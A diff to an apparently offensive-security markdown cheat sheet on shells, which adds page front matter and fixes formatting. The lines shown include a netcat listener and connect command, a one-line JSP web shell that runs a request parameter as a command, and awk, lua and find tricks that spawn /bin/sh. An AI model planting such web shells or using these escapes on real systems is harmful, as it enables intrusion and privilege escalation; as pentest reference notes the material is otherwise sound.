@@ -1,3 +1,7 @@
+---
+layout: default
+---
+
 # Shell
 ## LISTENING SHELL
 - `nc -lnvp 9999`
@@ -194,7 +198,7 @@ $ nc -nv 10.129.41.200 7777
 
 ## JSP
 ```jsp
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
 ## ASP
@@ -249,7 +253,7 @@ lua: os.execute('/bin/sh')
 awk 'BEGIN {system("/bin/sh")}'
 ```
 
- **Find**
+**Find**
 ```
 find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 ```
